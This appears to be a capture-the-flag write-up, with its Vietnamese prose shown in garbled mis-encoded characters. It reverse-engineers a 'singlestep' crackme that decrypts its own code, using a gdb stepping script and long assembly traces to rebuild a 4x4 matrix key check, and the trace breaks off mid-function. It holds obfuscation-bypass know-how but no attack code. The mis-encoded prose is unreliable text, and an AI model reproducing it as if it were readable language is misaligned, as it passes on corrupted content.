<p>·ªû b√™n trong n√†y, ch√∫ng ta th·∫•y m·ªôt ƒëo·∫°n d√†i m√£ th·ª±c thi thu·ªôc section .text m√† IDA kh√¥ng ƒë·ªçc ƒë∆∞·ª£c code x64 asm. Nh√¨n v√†o c√°c l·ªánh xor, m√¨nh nh·∫≠n ra r·∫±ng ch∆∞∆°ng tr√¨nh s·∫Ω gi·∫£i m√£ c√°c v√πng m√£ kh√¥ng ƒë·ªçc ƒë∆∞·ª£c ƒë√≥ b·∫±ng xor, th·ª±c thi l·ªánh ·ªü ƒë√≥ r·ªìi l·∫°i xor l·∫°i ƒë·ªÉ m√£ h√≥a 1 l·∫ßn n·ªØa. Do v·∫≠y ƒëo·∫°n m√£ n√†y ch·ªâ c√≥ th·ªÉ ƒë·ªçc ƒë∆∞·ª£c trong runtime, kh√¥ng th·ªÉ ƒë·ªçc ƒë∆∞·ª£c b·∫±ng c√°ch disassemble th√¥ng th∆∞·ªùng. C√°ch duy nh·∫•t m√¨nh nghƒ© ƒë∆∞·ª£c l√† l∆∞u l·∫°i code ƒë∆∞·ª£c gi·∫£i m√£ trong khi debug, tuy nhi√™n s·∫Ω r·∫•t m·∫•t th·ªùi gian n√™n m√¨nh ph·∫£i s·ª≠ d·ª•ng script (ƒë∆∞·ª£c t√†i tr·ª£ b·ªüi anh shynt_ :v) ƒë·ªÉ l∆∞u l·∫°i nh·ªØng ƒëo·∫°n code ƒë∆∞·ª£c deobfucasting trong khi ch·∫°y. Do m√¨nh quan t√¢m ƒë·∫øn ƒëo·∫°n code t·ª´ sau khi nh·∫≠p input n√™n m√¨nh s·∫Ω deobfuscating k·ªÉ t·ª´ ƒëo·∫°n y√™u c·∫ßu nh·∫≠p input. L∆∞u √Ω r·∫±ng trong t·∫•t c·∫£ c√°c string ƒë∆∞·ª£c in ra m√†n h√¨nh, ch·ªâ c√≥ duy nh·∫•t 1 string g·ªçi printf l√† &ldquo;Please enter the ‚ú® secret ‚ú® bequeathed to his cult following:&rdquo;, do v·∫≠y script s·∫Ω deobfuscating t·ª´ printf trong got.plt.</p>
<pre tabindex="0"><code>import gdb

gdb.execute(&#34;file singlestep&#34;)
gdb.execute(&#34;break printf@plt&#34;)
gdb.execute(&#34;run&#34;)

log_file = open(&#34;log.txt&#34;, &#34;w&#34;)

try:
    while True:
        gdb.execute(&#34;stepi&#34;, to_string=True)
        output = gdb.execute(&#34;x/i $pc&#34;, to_string=True)
        
        if &#34;xor&#34; in output and (&#34;BYTE&#34; in output or &#34;WORD&#34; in output or &#34;DWORD&#34; in output):
            continue

        if &#34;nop&#34; in output:
            continue

        if &#34;pushfq&#34; in output:
            continue

        if &#34;popfq&#34; in output:
            continue

        if &#34;pushf&#34; in output:
            continue

        if &#34;popf&#34; in output:
            continue

        
        # print(output.strip())
        log_file.write(output)
        log_file.flush()
except KeyboardInterrupt:
    print(&#34;&#34;)
finally:
    log_file.close()
</code></pre><h3 id="2-dynamic-analysis">2. Dynamic analysis</h3>
<p>ƒê·∫∑t breakpoint t·∫°i ƒëi·ªÉm ƒë·∫ßu ti√™n c·ªßa ƒëo·∫°n code ƒë∆∞·ª£c ghi l·∫°i b·ªüi script tr√™n. Ti·∫øp t·ª•c s·ª≠ d·ª•ng step into cho ƒë·∫øn khi ch∆∞∆°ng tr√¨nh ƒë·ªçc input, nh·∫≠p input r·ªìi d·ª´ng l·∫°i.</p>
<p></p>
<p>M√¨nh v√†o file log.txt, c·∫Øt script k·ªÉ t·ª´ ƒëo·∫°n n√†y cho ƒë·∫øn khi ch∆∞∆°ng tr√¨nh g·ªçi l·ªánh puts. ƒê√¢y s·∫Ω l√† ph·∫ßn logic ch√≠nh c·ªßa ch∆∞∆°ng tr√¨nh.</p>
<pre tabindex="0"><code>=&gt; 0x55555555b0a2:	mov    DWORD PTR [rbp-0x27c],eax
=&gt; 0x55555555b0d9:	cmp    DWORD PTR [rbp-0x27c],0x0
    ‚Üí cmp operands: DWORD PTR [rbp-0x27c] = N/A, 0x0 = 0
=&gt; 0x55555555b111:	js     0x55555555b2ba

=&gt; 0x55555555b141:	mov    eax,DWORD PTR [rbp-0x27c]
=&gt; 0x55555555b16e:	sub    eax,0x1
=&gt; 0x55555555b18e:	cdqe
=&gt; 0x55555555b1b1:	movzx  eax,BYTE PTR [rbp+rax*1-0x210]
=&gt; 0x55555555b1da:	cmp    al,0xa
    ‚Üí cmp operands: $al = 10, 0xa = 10
=&gt; 0x55555555b1fc:	jne    0x55555555b2ba

=&gt; 0x55555555b22c:	mov    eax,DWORD PTR [rbp-0x27c]
=&gt; 0x55555555b259:	sub    eax,0x1
=&gt; 0x55555555b279:	cdqe
=&gt; 0x55555555b29c:	mov    BYTE PTR [rbp+rax*1-0x210],0x0
=&gt; 0x55555555b2d6:	lea    rax,[rbp-0x210]
=&gt; 0x55555555b30b:	mov    rdi,rax
=&gt; 0x55555555b333:	call   0x555555557690
</code></pre><p>ƒê·ªçc ƒëo·∫°n asm n√†y k·∫øt h·ª£p v·ªõi debug, ch√∫ng ta d·ªÖ d√†ng nh·∫≠n ra ch∆∞∆°ng tr√¨nh lo·∫°i b·ªè k√Ω t·ª± &ldquo;/n&rdquo; cu·ªëi c√πng t·ª´ input, sau ƒë√≥ l∆∞u l·∫°i gi√° tr·ªã n√†y l√™n stack. Cu·ªëi ƒëo·∫°n m√£ n√†y, ch∆∞∆°ng tr√¨nh ƒë·∫©y ƒë·ªãa ch·ªâ c·ªßa v√πng nh·ªõ ch·ª©a chu·ªói input v√†o rdi.</p>
<pre tabindex="0"><code>=&gt; 0x55555555769c:	endbr64                            // kiem tra do dai input
=&gt; 0x5555555576b5:	push   rbp
=&gt; 0x5555555576d1:	mov    rbp,rsp
=&gt; 0x5555555576f2:	sub    rsp,0x18
=&gt; 0x55555555770e:	mov    QWORD PTR [rbp-0x18],rdi
=&gt; 0x555555557734:	mov    QWORD PTR [rbp-0x8],0x0
=&gt; 0x555555557765:	jmp    0x5555555577d0
=&gt; 0x5555555577dc:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x5555555577fe:	movzx  eax,BYTE PTR [rax]
=&gt; 0x55555555781e:	test   al,al
=&gt; 0x555555557840:	jne    0x55555555777a

=&gt; 0x55555555778d:	add    QWORD PTR [rbp-0x8],0x1
=&gt; 0x5555555577b8:	add    QWORD PTR [rbp-0x18],0x1
=&gt; 0x5555555577dc:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x5555555577fe:	movzx  eax,BYTE PTR [rax]
=&gt; 0x55555555781e:	test   al,al
=&gt; 0x555555557840:	jne    0x55555555777a
</code></pre><p>Ch∆∞∆°ng tr√¨nh b·∫Øt ƒë·∫ßu call m·ªôt h√†m, b√™n trong h√†m n√†y ch∆∞∆°ng tr√¨nh duy·ªát qua c√°c k√Ω t·ª± c·ªßa string v√† c·∫≠p nh·∫≠t k·∫øt qu·∫£ ƒë·ªô d√†i c·ªßa string. Khi v√≤ng l·∫∑p k·∫øt th√∫c, ch∆∞∆°ng tr√¨nh l∆∞u gi√° tr·ªã bi·∫øn ƒë·∫øm v√†o rax v√† tho√°t kh·ªèi h√†m, sau ƒë√≥ so s√°nh ƒë·ªô d√†i string v·ªõi 0x13.</p>
<pre tabindex="0"><code>=&gt; 0x555555557867:	mov    rax,QWORD PTR [rbp-0x8]
=&gt; 0x555555557880:	leave
=&gt; 0x55555555788a:	ret


=&gt; 0x55555555b357:	cmp    rax,0x13               // kiem tra do dai string.
    ‚Üí cmp operands: $rax = 19, 0x13 = 19
</code></pre><p>N·∫øu nh∆∞ ƒë·ªô d√†i string input th·ªèa m√£n ƒë·ªô d√†i 19, rip c·ªßa ch∆∞∆°ng tr√¨nh nh·∫£y ti·∫øp v√†o ƒëo·∫°n m√£ sau:</p>
<pre tabindex="0"><code>=&gt; 0x55555555b37c:	je     0x55555555b418                                       // loop kiem tra dieu kien dau tien
=&gt; 0x55555555b437:	mov    DWORD PTR [rbp-0x294],0x0
=&gt; 0x55555555b47c:	mov    BYTE PTR [rbp-0x296],0x1
=&gt; 0x55555555b4be:	mov    DWORD PTR [rbp-0x290],0x0
=&gt; 0x55555555b4fa:	jmp    0x55555555bd54
=&gt; 0x55555555bd70:	cmp    DWORD PTR [rbp-0x290],0x12
    ‚Üí cmp operands: DWORD PTR [rbp-0x290] = N/A, 0x12 = 18
=&gt; 0x55555555bda8:	jle    0x55555555b512

=&gt; 0x55555555b527:	mov    edx,DWORD PTR [rbp-0x290]
=&gt; 0x55555555b554:	movsxd rax,edx
=&gt; 0x55555555b585:	imul   rax,rax,0x66666667
=&gt; 0x55555555b5b4:	shr    rax,0x20
=&gt; 0x55555555b5cf:	sar    eax,1
=&gt; 0x55555555b5e7:	mov    ecx,edx
=&gt; 0x55555555b606:	sar    ecx,0x1f
=&gt; 0x55555555b626:	sub    eax,ecx
=&gt; 0x55555555b63e:	mov    ecx,eax
=&gt; 0x55555555b65d:	shl    ecx,0x2
=&gt; 0x55555555b67d:	add    ecx,eax
=&gt; 0x55555555b695:	mov    eax,edx
=&gt; 0x55555555b6ad:	sub    eax,ecx
=&gt; 0x55555555b6cc:	cmp    eax,0x4
    ‚Üí cmp operands: $eax = 0, 0x4 = 4
=&gt; 0x55555555b6f6:	jne    0x55555555b8e4
=&gt; 0x55555555b8f9:	mov    eax,DWORD PTR [rbp-0x294]
=&gt; 0x55555555b926:	lea    edx,[rax+0x1]
=&gt; 0x55555555b950:	mov    DWORD PTR [rbp-0x294],edx
=&gt; 0x55555555b980:	mov    edx,DWORD PTR [rbp-0x290]
=&gt; 0x55555555b9ad:	movsxd rdx,edx
=&gt; 0x55555555b9d8:	movzx  edx,BYTE PTR [rbp+rdx*1-0x210]
=&gt; 0x55555555ba01:	cdqe
=&gt; 0x55555555ba2a:	mov    BYTE PTR [rbp+rax*1-0x110],dl
=&gt; 0x55555555ba69:	movzx  edx,BYTE PTR [rbp-0x296]
=&gt; 0x55555555baa1:	mov    eax,DWORD PTR [rbp-0x290]
=&gt; 0x55555555bac7:	cdqe
=&gt; 0x55555555baea:	movzx  eax,BYTE PTR [rbp+rax*1-0x210]
=&gt; 0x55555555bb13:	cmp    al,0x40
    ‚Üí cmp operands: $al = 65, 0x40 = 64
=&gt; 0x55555555bb35:	jle    0x55555555bc63
=&gt; 0x55555555bb65:	mov    eax,DWORD PTR [rbp-0x290]
=&gt; 0x55555555bb8b:	cdqe
=&gt; 0x55555555bbae:	movzx  eax,BYTE PTR [rbp+rax*1-0x210]
=&gt; 0x55555555bbd7:	cmp    al,0x5a
    ‚Üí cmp operands: $al = 65, 0x5a = 90
=&gt; 0x55555555bbf9:	jg     0x55555555bc63
=&gt; 0x55555555bc23:	mov    eax,0x1
=&gt; 0x55555555bc4e:	jmp    0x55555555bc8e
=&gt; 0x55555555bc99:	and    eax,edx
=&gt; 0x55555555bcb1:	test   eax,eax
=&gt; 0x55555555bcd0:	setne  al
=&gt; 0x55555555bcfa:	mov    BYTE PTR [rbp-0x296],al
=&gt; 0x55555555bd31:	add    DWORD PTR [rbp-0x290],0x1
=&gt; 0x55555555bd70:	cmp    DWORD PTR [rbp-0x290],0x12
    ‚Üí cmp operands: DWORD PTR [rbp-0x290] = N/A, 0x12 = 18
=&gt; 0x55555555bda8:	jle    0x55555555b512
</code></pre><p>ƒêo·∫°n m√£ n√†y l·∫∑p qua c√°c gi√° tr·ªã c·ªßa string v√† ki·ªÉm tra ƒëi·ªÅu ki·ªán c·ªßa m·ªói k√Ω t·ª±. ·ªû c√°c index kh√¥ng chia h·∫øt cho 4, ch∆∞∆°ng tr√¨nh s·∫Ω ki·ªÉm tra xem gi√° tr·ªã c√≥ n·∫±m trong kho·∫£ng t·ª´ 0x41 ƒë·∫øn 0x5a hay kh√¥ng (c√°c gi√° tr·ªã c·ªßa k√Ω t·ª± ch·ªØ c√°i in hoa). ƒê·ªëi v·ªõi tr∆∞·ªùng h·ª£p index chia h·∫øt cho 4, ch∆∞∆°ng tr√¨nh s·∫Ω th·ª±c thi ki·ªÉm tra xem c√≥ ph·∫£i 0x2d (t·ª©c &lsquo;-&rsquo;) hay kh√¥ng.</p>
<pre tabindex="0"><code>=&gt; 0x55555555b72d:	movzx  edx,BYTE PTR [rbp-0x296]
=&gt; 0x55555555b765:	mov    eax,DWORD PTR [rbp-0x290]
=&gt; 0x55555555b78b:	cdqe
=&gt; 0x55555555b7ae:	movzx  eax,BYTE PTR [rbp+rax*1-0x210]
=&gt; 0x55555555b7d7:	cmp    al,0x2d
    ‚Üí cmp operands: $al = 45, 0x2d = 45
</code></pre><p>Tuy nhi√™n, ch∆∞∆°ng tr√¨nh ch·ªâ l∆∞u l·∫°i c√°c gi√° tr·ªã t·ª´ 0x41 ƒë·∫øn 0x5a (&lsquo;A&rsquo; ƒë·∫øn &lsquo;Z&rsquo;). Sau khi lo·∫°i b·ªè h·∫øt c√°c k√Ω t·ª± &lsquo;-&rsquo; trong string, ch∆∞∆°ng tr√¨nh ti·∫øp t·ª•c duy·ªát qua t·ª´ng ph·∫ßn t·ª≠ m·ªôt v√† th·ª±c hi·ªán 1 logic bi·∫øn ƒë·ªïi n√†o ƒë√≥.</p>
<pre tabindex="0"><code>=&gt; 0x55555555bfed:	mov    eax,DWORD PTR [rbp-0x28c]      // loop 1
=&gt; 0x55555555c024:	lea    edx,[rax*4+0x0]
=&gt; 0x55555555c05c:	mov    eax,DWORD PTR [rbp-0x288]
=&gt; 0x55555555c082:	add    eax,edx                               // k=4*i+j
=&gt; 0x55555555c09a:	cdqe
=&gt; 0x55555555c0bd:	movzx  eax,BYTE PTR [rbp+rax*1-0x110]       
=&gt; 0x55555555c0ed:	movsx  eax,al
=&gt; 0x55555555c114:	lea    edx,[rax-0x41]                 // edx=pos(input[k])
=&gt; 0x55555555c13e:	mov    eax,DWORD PTR [rbp-0x28c]
=&gt; 0x55555555c175:	imul   eax,DWORD PTR [rbp-0x288]
=&gt; 0x55555555c1a3:	mov    ecx,eax
=&gt; 0x55555555c1bb:	mov    eax,edx
=&gt; 0x55555555c1d3:	sub    eax,ecx                   
=&gt; 0x55555555c1f2:	movsxd rcx,eax                  //rcx=pos(input[k])-i*j
=&gt; 0x55555555c21c:	mov    eax,DWORD PTR [rbp-0x288]
=&gt; 0x55555555c249:	movsxd rdx,eax
=&gt; 0x55555555c273:	mov    eax,DWORD PTR [rbp-0x28c]
=&gt; 0x55555555c2a0:	movsxd rsi,eax
=&gt; 0x55555555c2d1:	lea    rax,[rbp-0x250]             
=&gt; 0x55555555c306:	mov    rdi,rax                                    
=&gt; 0x55555555c32e:	call   0x555555556180



=&gt; 0x55555555618c:	endbr64
=&gt; 0x5555555561a5:	push   rbp
=&gt; 0x5555555561c1:	mov    rbp,rsp
=&gt; 0x5555555561e2:	sub    rsp,0x30
=&gt; 0x5555555561fe:	mov    QWORD PTR [rbp-0x18],rdi     // 4
=&gt; 0x55555555621a:	mov    QWORD PTR [rbp-0x20],rsi    //  i
=&gt; 0x555555556236:	mov    QWORD PTR [rbp-0x28],rdx    // j
=&gt; 0x555555556252:	mov    QWORD PTR [rbp-0x30],rcx    // pos(input[k])-i*j
=&gt; 0x55555555626e:	mov    rax,QWORD PTR [rbp-0x18]    
=&gt; 0x555555556290:	mov    rax,QWORD PTR [rax]          
=&gt; 0x5555555562b1:	cmp    QWORD PTR [rbp-0x20],rax    // cmp i,4
    ‚Üí cmp operands: [rbp-0x20] = N/A, $rax = 4
=&gt; 0x5555555562d6:	jb     0x555555556343
=&gt; 0x55555555634f:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x55555555636b:	mov    rax,QWORD PTR [rax+0x8]    
=&gt; 0x555555556387:	cmp    QWORD PTR [rbp-0x28],rax          // cmp j,4
    ‚Üí cmp operands: [rbp-0x28] = N/A, $rax = 4           
=&gt; 0x5555555563ac:	jb     0x555555556419

=&gt; 0x555555556425:	mov    rax,QWORD PTR [rbp-0x18]    //
=&gt; 0x555555556441:	mov    rax,QWORD PTR [rax+0x8]
=&gt; 0x555555556464:	imul   rax,QWORD PTR [rbp-0x20]    
=&gt; 0x55555555648e:	mov    rdx,rax
=&gt; 0x5555555564af:	mov    rax,QWORD PTR [rbp-0x28]
=&gt; 0x5555555564d1:	add    rax,rdx                  
=&gt; 0x5555555564f2:	mov    QWORD PTR [rbp-0x8],rax       // QWORD PTR [rbp-0x8]=k
=&gt; 0x55555555650e:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x55555555652a:	mov    rdx,QWORD PTR [rax+0x10]    // rdx=0x555555574a40   # memory 1
=&gt; 0x555555556546:	mov    rax,QWORD PTR [rbp-0x8]   
=&gt; 0x555555556562:	shl    rax,0x3                        // shl 4*i+j,0x3
=&gt; 0x555555556584:	add    rdx,rax
=&gt; 0x5555555565a5:	mov    rax,QWORD PTR [rbp-0x30]
=&gt; 0x5555555565c7:	mov    QWORD PTR [rdx],rax                    // 0x555555574a40+(shl k,0x3) : pos(input[k])-i*j
=&gt; 0x5555555565ef:	mov    eax,0x1
=&gt; 0x555555556610:	leave
=&gt; 0x55555555661a:	ret
=&gt; 0x55555555c362:	add    DWORD PTR [rbp-0x288],0x1                      cap nhat index moi hang
=&gt; 0x55555555c3a1:	cmp    DWORD PTR [rbp-0x288],0x3
    ‚Üí cmp operands: DWORD PTR [rbp-0x288] = N/A, 0x3 = 3
=&gt; 0x55555555c3d9:	jle    0x55555555bfd8
</code></pre><p>ƒêo·∫°n m√£ n√†y t·∫£i c√°c ƒëo·∫°n 4 k√Ω t·ª± m·ªôt v√† l∆∞u v√†o 1 ƒë·ªãa ch·ªâ, m√¨nh d·ª±ng l·∫°i nh∆∞ sau.</p>
<pre tabindex="0"><code>k=4*i+j
for(i=0;i&lt;4;i++){
    for(j=0;j&lt;4;j++){
    (QWORD *) (0x555555574a40+k&lt;&lt;0x3)=input[k]-0x41-i*j
    }
}
</code></pre><p>Nh∆∞ v·∫≠y ch∆∞∆°ng tr√¨nh t·∫°o m·ªôt ma tr·∫≠n 4x4 g·ªìm c√°c gi√° tr·ªã l√† kho·∫£ng c√°ch t·ª´ v·ªã tr√≠ c·ªßa k√Ω t·ª± ƒë·∫øn &lsquo;A&rsquo; r·ªìi tr·ª´ ƒëi i*j. Ti·∫øp t·ª•c debug ch∆∞∆°ng tr√¨nh ta g·∫∑p ƒëo·∫°n m√£ sau.</p>
<pre tabindex="0"><code>=&gt; 0x55555555c5ff:	call   0x555555556630    /// phep nhan ma tran

=&gt; 0x55555555663c:	endbr64
=&gt; 0x555555556655:	push   rbp
=&gt; 0x555555556671:	mov    rbp,rsp
=&gt; 0x555555556692:	sub    rsp,0x50
=&gt; 0x5555555566ae:	mov    QWORD PTR [rbp-0x38],rdi
=&gt; 0x5555555566ca:	mov    QWORD PTR [rbp-0x40],rsi
=&gt; 0x5555555566e6:	mov    QWORD PTR [rbp-0x48],rdx
=&gt; 0x555555556713:	mov    rax,QWORD PTR fs:0x28
=&gt; 0x555555556745:	mov    QWORD PTR [rbp-0x8],rax
=&gt; 0x555555556779:	mov    rax,QWORD PTR [rbp-0x38]
=&gt; 0x555555556795:	mov    rdx,QWORD PTR [rax+0x8]
=&gt; 0x5555555567b1:	mov    rax,QWORD PTR [rbp-0x40]
=&gt; 0x5555555567d3:	mov    rax,QWORD PTR [rax]
=&gt; 0x5555555567fa:	cmp    rdx,rax
    ‚Üí cmp operands: $rdx = 4, $rax = 4
=&gt; 0x555555556824:	je     0x555555556891
=&gt; 0x55555555689d:	mov    rax,QWORD PTR [rbp-0x48]
=&gt; 0x5555555568bf:	mov    rdx,QWORD PTR [rax]
=&gt; 0x5555555568e0:	mov    rax,QWORD PTR [rbp-0x38]
=&gt; 0x555555556902:	mov    rax,QWORD PTR [rax]
=&gt; 0x555555556929:	cmp    rdx,rax
    ‚Üí cmp operands: $rdx = 4, $rax = 4
=&gt; 0x555555556953:	jne    0x555555556a31
=&gt; 0x55555555697a:	mov    rax,QWORD PTR [rbp-0x48]
=&gt; 0x555555556996:	mov    rdx,QWORD PTR [rax+0x8]
=&gt; 0x5555555569b2:	mov    rax,QWORD PTR [rbp-0x40]
=&gt; 0x5555555569ce:	mov    rax,QWORD PTR [rax+0x8]
=&gt; 0x5555555569f0:	cmp    rdx,rax
    ‚Üí cmp operands: $rdx = 4, $rax = 4
=&gt; 0x555555556a1a:	je     0x555555556a87
=&gt; 0x555555556aa3:	mov    DWORD PTR [rbp-0x2c],0x0
=&gt; 0x555555556ad9:	jmp    0x55555555749f
=&gt; 0x5555555574b1:	mov    eax,DWORD PTR [rbp-0x2c]
=&gt; 0x5555555574d8:	movsxd rdx,eax
=&gt; 0x5555555574f9:	mov    rax,QWORD PTR [rbp-0x38]
=&gt; 0x55555555751b:	mov    rax,QWORD PTR [rax]
=&gt; 0x555555557542:	cmp    rdx,rax
    ‚Üí cmp operands: $rdx = 0, $rax = 4
=&gt; 0x55555555756c:	jb     0x555555556af1
=&gt; 0x555555556b0d:	mov    DWORD PTR [rbp-0x28],0x0
=&gt; 0x555555556b43:	jmp    0x5555555573a6
=&gt; 0x5555555573b8:	mov    eax,DWORD PTR [rbp-0x28]
=&gt; 0x5555555573df:	movsxd rdx,eax
=&gt; 0x555555557400:	mov    rax,QWORD PTR [rbp-0x40]
=&gt; 0x55555555741c:	mov    rax,QWORD PTR [rax+0x8]
=&gt; 0x55555555743e:	cmp    rdx,rax
    ‚Üí cmp operands: $rdx = 0, $rax = 4
=&gt; 0x555555557468:	jb     0x555555556b5b
=&gt; 0x555555556b71:	mov    QWORD PTR [rbp-0x10],0x0
=&gt; 0x555555556bab:	mov    DWORD PTR [rbp-0x24],0x0
=&gt; 0x555555556be1:	jmp    0x5555555570bb
=&gt; 0x5555555570cd:	mov    eax,DWORD PTR [rbp-0x24]
=&gt; 0x5555555570f4:	movsxd rdx,eax
=&gt; 0x555555557115:	mov    rax,QWORD PTR [rbp-0x40]
=&gt; 0x555555557137:	mov    rax,QWORD PTR [rax]
=&gt; 0x55555555715e:	cmp    rdx,rax
    ‚Üí cmp operands: $rdx = 0, $rax = 4
=&gt; 0x555555557188:	jb     0x555555556bf9
=&gt; 0x555555556c0f:	mov    QWORD PTR [rbp-0x20],0x0
=&gt; 0x555555556c43:	mov    QWORD PTR [rbp-0x18],0x0
=&gt; 0x555555556c73:	mov    eax,DWORD PTR [rbp-0x24]
=&gt; 0x555555556c9a:	movsxd rdx,eax
=&gt; 0x555555556cc1:	mov    eax,DWORD PTR [rbp-0x2c]
=&gt; 0x555555556ce8:	movsxd rsi,eax
=&gt; 0x555555556d09:	lea    rcx,[rbp-0x20]
=&gt; 0x555555556d25:	mov    rax,QWORD PTR [rbp-0x38]
=&gt; 0x555555556d47:	mov    rdi,rax

=&gt; 0x555555556d6f:	call   0x555555555ca0

=&gt; 0x555555555cac:	endbr64
=&gt; 0x555555555cc5:	push   rbp
=&gt; 0x555555555ce1:	mov    rbp,rsp
=&gt; 0x555555555d02:	sub    rsp,0x30
=&gt; 0x555555555d1e:	mov    QWORD PTR [rbp-0x18],rdi
=&gt; 0x555555555d3a:	mov    QWORD PTR [rbp-0x20],rsi
=&gt; 0x555555555d56:	mov    QWORD PTR [rbp-0x28],rdx
=&gt; 0x555555555d72:	mov    QWORD PTR [rbp-0x30],rcx
=&gt; 0x555555555d8e:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x555555555db0:	mov    rax,QWORD PTR [rax]
=&gt; 0x555555555dd1:	cmp    QWORD PTR [rbp-0x20],rax
    ‚Üí cmp operands: [rbp-0x20] = N/A, $rax = 4
=&gt; 0x555555555df6:	jb     0x555555555e63
=&gt; 0x555555555e6f:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x555555555e8b:	mov    rax,QWORD PTR [rax+0x8]
=&gt; 0x555555555ea7:	cmp    QWORD PTR [rbp-0x28],rax
    ‚Üí cmp operands: [rbp-0x28] = N/A, $rax = 4
=&gt; 0x555555555ecc:	jb     0x555555555f39
=&gt; 0x555555555f45:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x555555555f61:	mov    rax,QWORD PTR [rax+0x8]
=&gt; 0x555555555f84:	imul   rax,QWORD PTR [rbp-0x20]
=&gt; 0x555555555fae:	mov    rdx,rax
=&gt; 0x555555555fcf:	mov    rax,QWORD PTR [rbp-0x28]
=&gt; 0x555555555ff1:	add    rax,rdx
=&gt; 0x555555556012:	mov    QWORD PTR [rbp-0x8],rax
=&gt; 0x55555555602e:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x55555555604a:	mov    rdx,QWORD PTR [rax+0x10]
=&gt; 0x555555556066:	mov    rax,QWORD PTR [rbp-0x8]
=&gt; 0x555555556082:	shl    rax,0x3
=&gt; 0x5555555560a4:	add    rax,rdx
=&gt; 0x5555555560cb:	mov    rdx,QWORD PTR [rax]
=&gt; 0x5555555560ec:	mov    rax,QWORD PTR [rbp-0x30]
=&gt; 0x55555555610e:	mov    QWORD PTR [rax],rdx
=&gt; 0x555555556136:	mov    eax,0x1
=&gt; 0x555555556157:	leave
=&gt; 0x555555556161:	ret

=&gt; 0x555555556db9:	test   al,al
=&gt; 0x555555556ddb:	je     0x555555556e48
=&gt; 0x555555556e5a:	mov    eax,DWORD PTR [rbp-0x28]
=&gt; 0x555555556e81:	movsxd rdx,eax
=&gt; 0x555555556ea8:	mov    eax,DWORD PTR [rbp-0x24]
=&gt; 0x555555556ecf:	movsxd rsi,eax
=&gt; 0x555555556ef0:	lea    rcx,[rbp-0x18]
=&gt; 0x555555556f0c:	mov    rax,QWORD PTR [rbp-0x40]
=&gt; 0x555555556f2e:	mov    rdi,rax
=&gt; 0x555555556f56:	call   0x555555555ca0
=&gt; 0x555555555cac:	endbr64
=&gt; 0x555555555cc5:	push   rbp
=&gt; 0x555555555ce1:	mov    rbp,rsp
=&gt; 0x555555555d02:	sub    rsp,0x30
=&gt; 0x555555555d1e:	mov    QWORD PTR [rbp-0x18],rdi
=&gt; 0x555555555d3a:	mov    QWORD PTR [rbp-0x20],rsi
=&gt; 0x555555555d56:	mov    QWORD PTR [rbp-0x28],rdx
=&gt; 0x555555555d72:	mov    QWORD PTR [rbp-0x30],rcx
=&gt; 0x555555555d8e:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x555555555db0:	mov    rax,QWORD PTR [rax]
=&gt; 0x555555555dd1:	cmp    QWORD PTR [rbp-0x20],rax
    ‚Üí cmp operands: [rbp-0x20] = N/A, $rax = 4
=&gt; 0x555555555df6:	jb     0x555555555e63
=&gt; 0x555555555e6f:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x555555555e8b:	mov    rax,QWORD PTR [rax+0x8]
=&gt; 0x555555555ea7:	cmp    QWORD PTR [rbp-0x28],rax
    ‚Üí cmp operands: [rbp-0x28] = N/A, $rax = 4
=&gt; 0x555555555ecc:	jb     0x555555555f39
=&gt; 0x555555555f45:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x555555555f61:	mov    rax,QWORD PTR [rax+0x8]
=&gt; 0x555555555f84:	imul   rax,QWORD PTR [rbp-0x20]
=&gt; 0x555555555fae:	mov    rdx,rax
=&gt; 0x555555555fcf:	mov    rax,QWORD PTR [rbp-0x28]
=&gt; 0x555555555ff1:	add    rax,rdx
=&gt; 0x555555556012:	mov    QWORD PTR [rbp-0x8],rax
=&gt; 0x55555555602e:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x55555555604a:	mov    rdx,QWORD PTR [rax+0x10]
=&gt; 0x555555556066:	mov    rax,QWORD PTR [rbp-0x8]
=&gt; 0x555555556082:	shl    rax,0x3
=&gt; 0x5555555560a4:	add    rax,rdx
=&gt; 0x5555555560cb:	mov    rdx,QWORD PTR [rax]
=&gt; 0x5555555560ec:	mov    rax,QWORD PTR [rbp-0x30]
=&gt; 0x55555555610e:	mov    QWORD PTR [rax],rdx
=&gt; 0x555555556136:	mov    eax,0x1
=&gt; 0x555555556157:	leave
=&gt; 0x555555556161:	ret


=&gt; 0x555555555cac:	endbr64
=&gt; 0x555555555cc5:	push   rbp
=&gt; 0x555555555ce1:	mov    rbp,rsp
=&gt; 0x555555555d02:	sub    rsp,0x30
=&gt; 0x555555555d1e:	mov    QWORD PTR [rbp-0x18],rdi
=&gt; 0x555555555d3a:	mov    QWORD PTR [rbp-0x20],rsi
=&gt; 0x555555555d56:	mov    QWORD PTR [rbp-0x28],rdx
=&gt; 0x555555555d72:	mov    QWORD PTR [rbp-0x30],rcx
=&gt; 0x555555555d8e:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x555555555db0:	mov    rax,QWORD PTR [rax]
=&gt; 0x555555555dd1:	cmp    QWORD PTR [rbp-0x20],rax
    ‚Üí cmp operands: [rbp-0x20] = N/A, $rax = 4
=&gt; 0x555555555df6:	jb     0x555555555e63
=&gt; 0x555555555e6f:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x555555555e8b:	mov    rax,QWORD PTR [rax+0x8]
=&gt; 0x555555555ea7:	cmp    QWORD PTR [rbp-0x28],rax
    ‚Üí cmp operands: [rbp-0x28] = N/A, $rax = 4
=&gt; 0x555555555ecc:	jb     0x555555555f39
=&gt; 0x555555555f45:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x555555555f61:	mov    rax,QWORD PTR [rax+0x8]
=&gt; 0x555555555f84:	imul   rax,QWORD PTR [rbp-0x20]
=&gt; 0x555555555fae:	mov    rdx,rax
=&gt; 0x555555555fcf:	mov    rax,QWORD PTR [rbp-0x28]
=&gt; 0x555555555ff1:	add    rax,rdx
=&gt; 0x555555556012:	mov    QWORD PTR [rbp-0x8],rax
=&gt; 0x55555555602e:	mov    rax,QWORD PTR [rbp-0x18]
